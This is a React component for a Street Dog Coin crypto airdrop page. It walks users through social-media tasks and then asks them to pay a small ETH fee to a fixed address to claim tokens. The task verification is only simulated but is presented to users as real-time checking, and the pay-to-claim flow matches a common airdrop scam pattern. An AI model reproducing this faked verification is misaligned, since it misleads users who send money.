"use client"

import React from "react"

import { useState, useEffect, useCallback } from "react"
import { Card, CardContent, CardDescription, CardFooter, CardHeader, CardTitle } from "@/components/ui/card"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import {
  CheckCircle2,
  AlertCircle,
  Loader2,
  Twitter,
  MessageCircle,
  Heart,
  Copy,
  ExternalLink,
  Wallet,
} from "lucide-react"
import { cn } from "@/lib/utils"
import { useToast } from "@/components/ui/use-toast"
import ConfettiExplosion from "react-confetti-explosion"
import { Progress } from "@/components/ui/progress"
import { addClaim, getClaimByWalletAddress, getSystemConfig } from "@/lib/storage-service"

// Memoizar o componente de tarefa individual para evitar re-renderizações desnecessárias
const TaskItem = React.memo(
  ({
    task,
    handleInputChange,
    handleVerifyTask,
    copyHashtags,
  }: {
    task: Task
    handleInputChange: (taskId: number, value: string) => void
    handleVerifyTask: (taskId: number) => void
    copyHashtags: () => void
  }) => {
    return (
      <div
        key={task.id}
        className={cn(
          "flex items-start p-4 rounded-lg border transition-all",
          task.status === "completed"
            ? "border-green-600/30 bg-green-900/10"
            : task.status === "failed"
              ? "border-red-600/30 bg-red-900/10"
              : task.current
                ? "border-purple-600/30 bg-purple-900/10"
                : "border-gray-800/30 bg-black/20 opacity-70",
        )}
      >
        <div className="mr-4 mt-0.5">
          {task.status === "completed" ? (
            <div className="h-6 w-6 rounded-full bg-green-900/50 flex items-center justify-center">
              <CheckCircle2 className="h-4 w-4 text-green-400" />
            </div>
          ) : task.status === "verifying" ? (
            <div className="h-6 w-6 rounded-full bg-blue-900/50 flex items-center justify-center">
              <Loader2 className="h-4 w-4 text-blue-400 animate-spin" />
            </div>
          ) : task.status === "failed" ? (
            <div className="h-6 w-6 rounded-full bg-red-900/50 flex items-center justify-center">
              <AlertCircle className="h-4 w-4 text-red-400" />
            </div>
          ) : (
            <div className="h-6 w-6 rounded-full bg-purple-900/50 border border-purple-500/50 flex items-center justify-center">
              {task.icon}
            </div>
          )}
        </div>
        <div className="flex-1 space-y-2">
          <div>
            <h3
              className={cn(
                "font-medium",
                task.status === "completed"
                  ? "text-green-400"
                  : task.status === "failed"
                    ? "text-red-400"
                    : task.current
                      ? "text-purple-300"
                      : "text-gray-400",
              )}
            >
              {task.title}
            </h3>
            <p className="text-sm text-gray-400 mt-1">{task.description}</p>
          </div>

          {task.id === 2 && (
            <div className="bg-purple-900/10 border border-purple-800/20 rounded p-2 text-xs text-gray-300 font-mono relative">
              <div className="max-h-20 overflow-y-auto pr-2">{task.hashtags}</div>
              <button
                onClick={copyHashtags}
                className="absolute top-2 right-2 text-purple-400 hover:text-purple-300"
                title="Copiar hashtags"
              >
                <Copy className="h-4 w-4" />
              </button>
            </div>
          )}

          {task.link && (
            <a
              href={task.link}
              target="_blank"
              rel="noopener noreferrer"
              className="inline-flex items-center text-sm text-purple-400 hover:text-purple-300"
            >
              {task.linkText} <ExternalLink className="ml-1 h-3 w-3" />
            </a>
          )}

          {task.secondaryLink && (
            <a
              href={task.secondaryLink}
              target="_blank"
              rel="noopener noreferrer"
              className="inline-flex items-center text-sm text-purple-400 hover:text-purple-300 mt-1"
            >
              {task.secondaryLinkText} <ExternalLink className="ml-1 h-3 w-3" />
            </a>
          )}

          {task.inputPlaceholder && (task.current || task.status === "failed") && (
            <div className="flex gap-2">
              <Input
                placeholder={task.inputPlaceholder}
                value={task.inputValue || ""}
                onChange={(e) => handleInputChange(task.id, e.target.value)}
                className="bg-black/50 border-purple-800/30 text-white"
                disabled={task.status === "verifying" || task.status === "completed"}
              />
              <Button
                onClick={() => handleVerifyTask(task.id)}
                disabled={!task.inputValue || task.status === "verifying" || task.status === "completed"}
                className={
                  task.status === "completed" ? "bg-green-600 hover:bg-green-700" : "bg-purple-600 hover:bg-purple-700"
                }
              >
                {task.status === "verifying" ? (
                  <>
                    <Loader2 className="mr-2 h-4 w-4 animate-spin" />
                    Verificando...
                  </>
                ) : task.status === "completed" ? (
                  <>
                    <CheckCircle2 className="mr-2 h-4 w-4" />
                    Verificado
                  </>
                ) : (
                  "Verificar"
                )}
              </Button>
            </div>
          )}

          {task.id === 3 && (task.current || task.status === "failed") && (
            <Button
              onClick={() => handleVerifyTask(task.id)}
              disabled={task.status === "verifying" || task.status === "completed"}
              className={
                task.status === "completed" ? "bg-green-600 hover:bg-green-700" : "bg-purple-600 hover:bg-purple-700"
              }
            >
              {task.status === "verifying" ? (
                <>
                  <Loader2 className="mr-2 h-4 w-4 animate-spin" />
                  Verificando...
                </>
              ) : task.status === "completed" ? (
                <>
                  <CheckCircle2 className="mr-2 h-4 w-4" />
                  Verificado
                </>
              ) : (
                "Verificar curtida"
              )}
            </Button>
          )}
        </div>
      </div>
    )
  },
)
TaskItem.displayName = "TaskItem"

declare global {
  interface Window {
    ethereum?: {
      request: (args: { method: string; params?: any[] }) => Promise<any>
      isMetaMask?: boolean
      on: (event: string, callback: any) => void
    }
  }
}

type TaskStatus = "pending" | "completed" | "verifying" | "failed"

interface Task {
  id: number
  title: string
  description: string
  status: TaskStatus
  current: boolean
  inputValue?: string
  inputPlaceholder?: string
  link?: string
  linkText?: string
  secondaryLink?: string
  secondaryLinkText?: string
  icon: React.ReactNode
  hashtags?: string
}

interface AirdropTasksProps {
  walletAddress: string
  walletType: string
}

export default function AirdropTasks({ walletAddress, walletType }: AirdropTasksProps) {
  const { toast } = useToast()
  const [tasks, setTasks] = useState<Task[]>([
    {
      id: 1,
      title: "Seguir no Twitter",
      description: "Siga @StreetDogCoin",
      status: "pending",
      current: true,
      inputValue: "",
      inputPlaceholder: "Digite seu nome de usuário do Twitter",
      link: "https://x.com/StreetDogCoin",
      linkText: "Seguir @StreetDogCoin",
      icon: <Twitter className="h-5 w-5 text-blue-400" />,
    },
    {
      id: 2,
      title: "Retweet com Hashtags",
      description: "Faça um quote retweet do tweet do Street Dog Coin com as hashtags",
      status: "pending",
      current: false,
      inputValue: "",
      inputPlaceholder: "Cole o link do seu retweet",
      link: "https://x.com/StreetDogCoin/status/1899498294054707634",
      linkText: "Ver tweet para retweet",
      icon: <Twitter className="h-5 w-5 text-blue-400" />,
    },
    {
      id: 3,
      title: "Curtir no Twitter",
      description: "Curta o tweet do Street Dog Coin",
      status: "pending",
      current: false,
      link: "https://x.com/intent/like?tweet_id=1899498294054707634",
      linkText: "Curtir tweet",
      icon: <Heart className="h-5 w-5 text-red-400" />,
    },
    {
      id: 4,
      title: "Entrar no Grupo do Telegram",
      description: "Entre no grupo do Telegram do Street Dog Coin e obtenha seu ID",
      status: "pending",
      current: false,
      inputValue: "",
      inputPlaceholder: "Digite seu ID do Telegram (ex: 6123567677)",
      link: "https://t.me/StreetDogCoin",
      linkText: "Entrar no grupo do Telegram",
      icon: <MessageCircle className="h-5 w-5 text-blue-400" />,
      secondaryLink: "https://t.me/userinfobot",
      secondaryLinkText: "Obtenha seu ID de usuário do Telegram",
    },
  ])

  const [verificationStatus, setVerificationStatus] = useState<"idle" | "verifying" | "completed" | "failed">("idle")
  const [verificationProgress, setVerificationProgress] = useState(0)
  const [claimStatus, setClaimStatus] = useState<"idle" | "paying" | "confirming" | "completed" | "failed">("idle")
  const [isExploding, setIsExploding] = useState(false)
  const [hashtags] = useState(
    "#airdrop #Dogecoin #eth #ShibaInu #mainnet #pepecoin #web3 #crypto #arbitrum #TieBank #BancoDigital #StreetDogCoin #CryptoForACause #CryptoForACause #DogAdoption #BlockchainForGood #CryptoWithPurpose #SupportAnimalRescue #DogRescue #StreetDogs #CharityCrypto #DogLovers",
  )
  const [existingClaim, setExistingClaim] = useState(false)
  const [systemConfig, setSystemConfig] = useState<any>(null)

  // Endereço para receber as taxas
  const RECIPIENT_ADDRESS = "0x0Fcf41A546b2de64aBDc320703dDD657dF802Eb4"
  // Valor da taxa em ETH (equivalente a 0.04 USD)
  // Nota: Em um ambiente real, você pode querer usar uma API para obter a taxa de câmbio atual
  const FEE_AMOUNT = "0.000012" // Aproximadamente 0.04 USD em ETH na rede Sepolia

  // Verificar se o usuário já fez uma reivindicação
  useEffect(() => {
    if (walletAddress) {
      try {
        const claim = getClaimByWalletAddress(walletAddress)
        if (claim) {
          setExistingClaim(true)
          toast({
            title: "Reivindicação existente",
            description: "Este endereço de carteira já fez uma reivindicação.",
            variant: "destructive",
          })
        }

        // Carregar configurações do sistema
        const config = getSystemConfig()
        setSystemConfig(config)

        // Ajustar tarefas com base nas configurações
        if (config && (!config.requireTwitter || !config.requireTelegram)) {
          setTasks((prevTasks) => {
            let updatedTasks = [...prevTasks]

            if (!config.requireTwitter) {
              // Remover tarefas relacionadas ao Twitter
              updatedTasks = updatedTasks.filter((task) => task.id !== 1 && task.id !== 2 && task.id !== 3)
            }

            if (!config.requireTelegram) {
              // Remover tarefa do Telegram
              updatedTasks = updatedTasks.filter((task) => task.id !== 4)
            }

            // Atualizar a tarefa atual
            if (updatedTasks.length > 0) {
              updatedTasks = updatedTasks.map((task, index) => ({
                ...task,
                current: index === 0,
              }))
            }

            return updatedTasks
          })
        }
      } catch (error) {
        console.error("Erro ao verificar reivindicação:", error)
      }
    }
  }, [walletAddress, toast])

  const handleInputChange = (taskId: number, value: string) => {
    setTasks((prevTasks) => prevTasks.map((task) => (task.id === taskId ? { ...task, inputValue: value } : task)))
  }

  const handleVerifyTask = (taskId: number) => {
    // Verificação básica para cada tarefa
    const task = tasks.find((t) => t.id === taskId)
    if (!task) return

    setTasks((prevTasks) => prevTasks.map((task) => (task.id === taskId ? { ...task, status: "verifying" } : task)))

    // Simulação de verificação
    setTimeout(() => {
      let verified = false
      let errorMessage = ""

      switch (taskId) {
        case 1: // Twitter follow
          verified = !!task.inputValue && task.inputValue.trim().length > 0
          errorMessage = "Por favor, insira um nome de usuário válido"
          break
        case 2: // Retweet
          verified = (!!task.inputValue && task.inputValue.includes("twitter.com")) || task.inputValue.includes("x.com")
          errorMessage = "Por favor, insira um link de retweet válido"
          break
        case 3: // Like
          verified = true // Simulação de verificação automática
          break
        case 4: // Telegram
          verified = !!task.inputValue && /^\d{5,}$/.test(task.inputValue)
          errorMessage = "Por favor, insira um ID de Telegram válido (apenas números)"
          break
      }

      if (verified) {
        setTasks((prevTasks) => {
          const updatedTasks = prevTasks.map((task) => {
            if (task.id === taskId) {
              return { ...task, status: "completed", current: false }
            } else if (task.id === taskId + 1 && task.status === "pending") {
              return { ...task, current: true }
            }
            return task
          })
          return updatedTasks
        })

        toast({
          title: "Tarefa verificada",
          description: `A tarefa "${task.title}" foi verificada com sucesso!`,
          className: "bg-green-950 border-green-800 text-green-100",
        })
      } else {
        setTasks((prevTasks) => prevTasks.map((task) => (task.id === taskId ? { ...task, status: "failed" } : task)))

        toast({
          title: "Falha na verificação",
          description: errorMessage || "Não foi possível verificar esta tarefa. Tente novamente.",
          variant: "destructive",
        })
      }
    }, 1500)
  }

  const handleStartVerification = async () => {
    const incompleteTasks = tasks.filter((task) => task.status !== "completed")

    if (incompleteTasks.length > 0) {
      toast({
        title: "Tarefas incompletas",
        description: "Complete todas as tarefas antes de iniciar a verificação.",
        variant: "destructive",
      })
      return
    }

    setVerificationStatus("verifying")
    setVerificationProgress(0)

    // Simulação de progresso de verificação
    const interval = setInterval(() => {
      setVerificationProgress((prev) => {
        if (prev >= 100) {
          clearInterval(interval)
          return 100
        }
        return prev + 1
      })
    }, 100)

    // Simulação de verificação completa após 10 segundos
    setTimeout(() => {
      clearInterval(interval)
      setVerificationProgress(100)
      setVerificationStatus("completed")

      toast({
        title: "Verificação concluída",
        description: "Todas as tarefas foram verificadas com sucesso! Você pode reivindicar seus tokens agora.",
        className: "bg-green-950 border-green-800 text-green-100",
      })
    }, 10000)
  }

  // Função para converter ETH para Wei (formato hexadecimal)
  const ethToWei = (ethAmount: string): string => {
    // 1 ETH = 10^18 Wei
    const wei = Number.parseFloat(ethAmount) * 1e18
    // Converter para hexadecimal (formato 0x...)
    return "0x" + Math.floor(wei).toString(16)
  }

  // Otimizar a função handleClaimTokens para evitar re-renderizações desnecessárias
  // Usar useCallback para funções que são passadas como props

  // Modificar a função handleClaimTokens para adicionar notificação WhatsApp
  // Substituir a implementação existente por esta versão melhorada
  const handleClaimTokens = useCallback(async () => {
    if (verificationStatus !== "completed") {
      toast({
        title: "Verificação necessária",
        description: "Complete a verificação de todas as tarefas antes de reivindicar tokens.",
        variant: "destructive",
      })
      return
    }

    if (existingClaim) {
      toast({
        title: "Reivindicação existente",
        description: "Este endereço de carteira já fez uma reivindicação.",
        variant: "destructive",
      })
      return
    }

    // Iniciar processo de pagamento
    setClaimStatus("paying")

    try {
      // Verificar se o provider está disponível
      if (!window.ethereum) {
        throw new Error("Carteira Web3 não encontrada. Por favor, instale o MetaMask.")
      }

      // Solicitar acesso à conta
      const accounts = await window.ethereum.request({ method: "eth_requestAccounts" })
      if (!accounts || accounts.length === 0) {
        throw new Error("Nenhuma conta encontrada ou acesso negado.")
      }

      // Converter o valor da taxa de ETH para Wei (formato hexadecimal)
      const valueInWei = ethToWei(FEE_AMOUNT)

      // Preparar a transação - agora com valor para enviar ETH
      const transactionParameters = {
        to: RECIPIENT_ADDRESS, // Endereço que receberá a taxa
        from: accounts[0], // Endereço do usuário
        value: valueInWei, // Valor em wei (0.04 USD em ETH)
      }

      // Notificar o usuário sobre a taxa
      toast({
        title: "Pagamento de taxa",
        description: `Sua carteira será aberta para autorizar o pagamento de ${FEE_AMOUNT} ETH (aprox. $0.04 USD) para reivindicar seus tokens.`,
        className: "bg-blue-950 border-blue-800 text-blue-100",
      })

      // Enviar a transação
      const txHash = await window.ethereum.request({
        method: "eth_sendTransaction",
        params: [transactionParameters],
      })

      // Transação enviada, aguardar confirmação
      setClaimStatus("confirming")

      toast({
        title: "Transação enviada",
        description: "Aguardando confirmação da transação na blockchain...",
        className: "bg-blue-950 border-blue-800 text-blue-100",
      })

      // Aguardar confirmação da transação
      const checkTransaction = async () => {
        try {
          const receipt = await window.ethereum.request({
            method: "eth_getTransactionReceipt",
            params: [txHash],
          })

          if (receipt) {
            // Transação confirmada
            const twitterUsername = tasks.find((t) => t.id === 1)?.inputValue || ""
            const telegramId = tasks.find((t) => t.id === 4)?.inputValue || ""
            const tokensPerClaim = systemConfig?.tokensPerClaim || 1000

            // Adicionar reivindicação ao armazenamento
            addClaim({
              name: twitterUsername,
              walletAddress,
              walletType,
              twitterUsername,
              telegramId,
              tokensRequested: tokensPerClaim,
            })

            // Enviar notificação WhatsApp para o administrador
            try {
              await sendWhatsAppNotification(walletAddress, twitterUsername, telegramId)
              console.log("Notificação WhatsApp enviada com sucesso")
            } catch (notifyError) {
              console.error("Erro ao enviar notificação WhatsApp:", notifyError)
              // Não falhar a reivindicação se a notificação falhar
            }

            setClaimStatus("completed")
            setIsExploding(true)

            toast({
              title: "Tokens Reivindicados!",
              description:
                "Parabéns! Sua taxa foi paga com sucesso e seus tokens $STDOG foram reivindicados. Eles serão enviados para sua carteira em breve.",
              className: "bg-green-950 border-green-800 text-green-100",
            })
          } else {
            // Continuar verificando
            setTimeout(checkTransaction, 1000)
          }
        } catch (error) {
          console.error("Erro ao verificar transação:", error)
        }
      }

      // Iniciar verificação da transação
      checkTransaction()
    } catch (error) {
      console.error("Erro ao processar transação:", error)
      setClaimStatus("failed")

      let errorMessage = "Ocorreu um erro ao processar a transação."

      if (error instanceof Error) {
        if (error.message.includes("user rejected") || error.message.includes("user denied")) {
          errorMessage = "Você rejeitou a transação na sua carteira."
        } else if (error.message.includes("insufficient funds")) {
          errorMessage = "Saldo insuficiente para pagar a taxa de reivindicação."
        } else {
          errorMessage = error.message
        }
      }

      toast({
        title: "Erro na transação",
        description: errorMessage,
        variant: "destructive",
      })
    }
  }, [verificationStatus, existingClaim, toast, systemConfig, tasks, walletAddress, walletType])

  // Adicionar a função de envio de notificação WhatsApp logo abaixo
  // Esta função envia a notificação para o número fornecido
  const sendWhatsAppNotification = async (walletAddress: string, twitterUsername: string, telegramId: string) => {
    try {
      // Enviar a requisição para nosso servidor
      const response = await fetch("/api/notify-claim", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          walletAddress,
          twitterUsername,
          telegramId,
        }),
      })

      if (!response.ok) {
        const errorText = await response.text()
        console.error("Erro ao enviar notificação WhatsApp:", errorText)
        throw new Error(`Erro ao enviar notificação: ${errorText}`)
      }

      return await response.json()
    } catch (error) {
      console.error("Erro ao enviar notificação WhatsApp:", error)
      throw error
    }
  }

  const copyHashtags = () => {
    navigator.clipboard.writeText(hashtags)
    toast({
      title: "Copiado!",
      description: "Hashtags copiadas para a área de transferência",
      duration: 3000,
    })
  }

  const allTasksCompleted = tasks.every((task) => task.status === "completed")

  if (existingClaim) {
    return (
      <Card className="border-purple-800/30 bg-black/30 backdrop-blur-sm shadow-xl overflow-hidden">
        <CardHeader className="border-b border-purple-900/20 bg-black/50">
          <CardTitle className="text-xl text-purple-400">Reivindicação Existente</CardTitle>
          <CardDescription className="text-gray-400">
            Este endereço de carteira já fez uma reivindicação
          </CardDescription>
        </CardHeader>
        <CardContent className="p-6">
          <div className="bg-blue-900/20 border border-blue-700/30 rounded-lg p-4 flex items-start">
            <CheckCircle2 className="h-5 w-5 text-blue-400 mr-3 mt-0.5" />
            <div>
              <h4 className="font-medium text-blue-400">Reivindicação já processada</h4>
              <p className="text-sm text-gray-300 mt-1">
                Seu endereço de carteira já está registrado para receber tokens $STDOG. Não é necessário fazer uma nova
                reivindicação.
              </p>
            </div>
          </div>
        </CardContent>
      </Card>
    )
  }

  return (
    <Card className="border-purple-800/30 bg-black/30 backdrop-blur-sm shadow-xl overflow-hidden">
      <CardHeader className="border-b border-purple-900/20 bg-black/50">
        <CardTitle className="text-xl text-purple-400">Tarefas de Participação</CardTitle>
        <CardDescription className="text-gray-400">
          Siga estas etapas para participar do airdrop Street Dog Coin e ter a chance de receber tokens gratuitos.
        </CardDescription>
      </CardHeader>
      <CardContent className="p-6">
        <div className="space-y-6">
          {/* Lista de tarefas */}
          <div className="space-y-4">
            {tasks.map((task) => (
              <TaskItem
                key={task.id}
                task={{ ...task, hashtags: hashtags }}
                handleInputChange={handleInputChange}
                handleVerifyTask={handleVerifyTask}
                copyHashtags={copyHashtags}
              />
            ))}
          </div>

          {/* Seção de verificação */}
          <div className="border border-purple-800/30 bg-purple-900/10 rounded-lg p-4">
            <h3 className="text-lg font-medium text-purple-300 mb-2">Verificação de Tarefas</h3>
            <p className="text-sm text-gray-300 mb-4">
              Após completar todas as tarefas, inicie a verificação para habilitar a reivindicação do airdrop. Nosso
              sistema verificará em tempo real se você completou todas as tarefas necessárias. Este processo leva
              aproximadamente 100 segundos.
            </p>

            {!allTasksCompleted && (
              <div className="bg-yellow-900/20 border border-yellow-700/30 rounded-lg p-3 mb-4 flex items-start">
                <AlertCircle className="h-5 w-5 text-yellow-400 mr-3 mt-0.5" />
                <div>
                  <h4 className="font-medium text-yellow-400">Tarefas Incompletas</h4>
                  <p className="text-sm text-gray-300 mt-1">
                    Complete todas as tarefas antes de iniciar a verificação.
                  </p>
                </div>
              </div>
            )}

            {verificationStatus === "verifying" && (
              <div className="mb-4">
                <div className="flex justify-between mb-1">
                  <span className="text-sm text-gray-400">Progresso da verificação</span>
                  <span className="text-sm text-purple-300">{verificationProgress}%</span>
                </div>
                <Progress
                  value={verificationProgress}
                  className="h-2 bg-purple-900/20"
                  indicatorClassName="bg-purple-500"
                />
              </div>
            )}

            {verificationStatus === "completed" ? (
              <div className="bg-green-900/20 border border-green-700/30 rounded-lg p-3 mb-4 flex items-start">
                <CheckCircle2 className="h-5 w-5 text-green-400 mr-3 mt-0.5" />
                <div>
                  <h4 className="font-medium text-green-400">Verificação Concluída</h4>
                  <p className="text-sm text-gray-300 mt-1">
                    Todas as tarefas foram verificadas com sucesso! Você pode reivindicar seus tokens agora.
                  </p>
                </div>
              </div>
            ) : (
              <Button
                onClick={handleStartVerification}
                disabled={!allTasksCompleted || verificationStatus === "verifying"}
                className="w-full bg-purple-600 hover:bg-purple-700"
              >
                {verificationStatus === "verifying" ? (
                  <>
                    <Loader2 className="mr-2 h-4 w-4 animate-spin" />
                    Verificando...
                  </>
                ) : (
                  "Iniciar Verificação"
                )}
              </Button>
            )}
          </div>

          {/* Seção de reivindicação */}
          <div className="border border-purple-800/30 bg-purple-900/10 rounded-lg p-4">
            <h3 className="text-lg font-medium text-purple-300 mb-2">Reivindicar Tokens</h3>
            <p className="text-sm text-gray-300 mb-4">
              Reivindique seus tokens $STDOG do airdrop do Street Dog Coin. Para completar a reivindicação, é necessário
              pagar uma taxa de {FEE_AMOUNT} ETH (aproximadamente $0.04 USD).
            </p>

            {verificationStatus !== "completed" && (
              <div className="bg-blue-900/20 border border-blue-700/30 rounded-lg p-3 mb-4 flex items-start">
                <AlertCircle className="h-5 w-5 text-blue-400 mr-3 mt-0.5" />
                <div>
                  <h4 className="font-medium text-blue-400">Verificação Necessária</h4>
                  <p className="text-sm text-gray-300 mt-1">
                    Complete todas as tarefas obrigatórias e a verificação para reivindicar tokens.
                  </p>
                </div>
              </div>
            )}

            {verificationStatus === "completed" && (
              <div className="bg-blue-900/20 border border-blue-700/30 rounded-lg p-3 mb-4 flex items-start">
                <Wallet className="h-5 w-5 text-blue-400 mr-3 mt-0.5" />
                <div>
                  <h4 className="font-medium text-blue-400">Informações da Taxa</h4>
                  <p className="text-sm text-gray-300 mt-1">
                    Ao clicar em "Reivindicar Tokens", sua carteira será aberta para autorizar o pagamento de{" "}
                    {FEE_AMOUNT} ETH (aproximadamente $0.04 USD) para completar a reivindicação.
                  </p>
                  <p className="text-sm text-gray-300 mt-1">Endereço para pagamento:</p>
                  <div className="mt-1 text-xs text-gray-400 flex items-center">
                    <span className="font-mono mr-2">{RECIPIENT_ADDRESS}</span>
                    <button
                      onClick={() => {
                        navigator.clipboard.writeText(RECIPIENT_ADDRESS)
                        toast({
                          title: "Endereço copiado",
                          description: "Endereço de pagamento copiado para a área de transferência",
                          duration: 3000,
                        })
                      }}
                      className="text-purple-400 hover:text-purple-300"
                    >
                      <Copy className="h-3 w-3" />
                    </button>
                  </div>
                </div>
              </div>
            )}

            {claimStatus === "paying" && (
              <div className="bg-yellow-900/20 border border-yellow-700/30 rounded-lg p-3 mb-4 flex items-start">
                <Loader2 className="h-5 w-5 text-yellow-400 mr-3 mt-0.5 animate-spin" />
                <div>
                  <h4 className="font-medium text-yellow-400">Aguardando Autorização</h4>
                  <p className="text-sm text-gray-300 mt-1">
                    Por favor, verifique sua extensão de carteira e autorize o pagamento da taxa. Não feche esta janela.
                  </p>
                </div>
              </div>
            )}

            {claimStatus === "confirming" && (
              <div className="bg-yellow-900/20 border border-yellow-700/30 rounded-lg p-3 mb-4 flex items-start">
                <Loader2 className="h-5 w-5 text-yellow-400 mr-3 mt-0.5 animate-spin" />
                <div>
                  <h4 className="font-medium text-yellow-400">Confirmando Transação</h4>
                  <p className="text-sm text-gray-300 mt-1">
                    Sua transação foi enviada e está sendo confirmada na blockchain. Este processo pode levar alguns
                    minutos dependendo do congestionamento da rede.
                  </p>
                </div>
              </div>
            )}

            {claimStatus === "completed" && (
              <div className="bg-green-900/20 border border-green-700/30 rounded-lg p-3 mb-4 flex items-start">
                <CheckCircle2 className="h-5 w-5 text-green-400 mr-3 mt-0.5" />
                <div>
                  <h4 className="font-medium text-green-400">Tokens Reivindicados!</h4>
                  <p className="text-sm text-gray-300 mt-1">
                    Parabéns! Sua taxa foi paga com sucesso e seus tokens $STDOG foram reivindicados. Eles serão
                    enviados para sua carteira em breve.
                  </p>
                </div>
              </div>
            )}

            {claimStatus === "failed" && (
              <div className="bg-red-900/20 border border-red-700/30 rounded-lg p-3 mb-4 flex items-start">
                <AlertCircle className="h-5 w-5 text-red-400 mr-3 mt-0.5" />
                <div>
                  <h4 className="font-medium text-red-400">Falha na Transação</h4>
                  <p className="text-sm text-gray-300 mt-1">
                    Ocorreu um erro ao processar sua transação. Verifique se você tem saldo suficiente para pagar a taxa
                    de reivindicação e tente novamente.
                  </p>
                </div>
              </div>
            )}

            <Button
              onClick={handleClaimTokens}
              disabled={
                verificationStatus !== "completed" ||
                claimStatus === "paying" ||
                claimStatus === "confirming" ||
                claimStatus === "completed"
              }
              className="w-full bg-green-600 hover:bg-green-700"
            >
              {claimStatus === "paying" ? (
                <>
                  <Loader2 className="mr-2 h-4 w-4 animate-spin" />
                  Aguardando autorização na carteira...
                </>
              ) : claimStatus === "confirming" ? (
                <>
                  <Loader2 className="mr-2 h-4 w-4 animate-spin" />
                  Confirmando transação...
                </>
              ) : claimStatus === "completed" ? (
                <>
                  <CheckCircle2 className="mr-2 h-4 w-4" />
                  Tokens Reivindicados
                </>
              ) : (
                <>
                  <Wallet className="mr-2 h-4 w-4" />
                  Reivindicar Tokens
                </>
              )}
            </Button>

            {isExploding && (
              <div className="fixed inset-0 flex items-center justify-center pointer-events-none z-50">
                <ConfettiExplosion force={0.8} duration={3000} particleCount={250} width={1600} />
              </div>
            )}
          </div>
        </div>
      </CardContent>
      <CardFooter className="border-t border-purple-900/20 flex flex-col items-start p-4 bg-black/50">
        <p className="text-sm text-gray-400">
          Todas as informações serão armazenadas separadamente para cada carteira participante.
        </p>
      </CardFooter>
    </Card>
  )
}

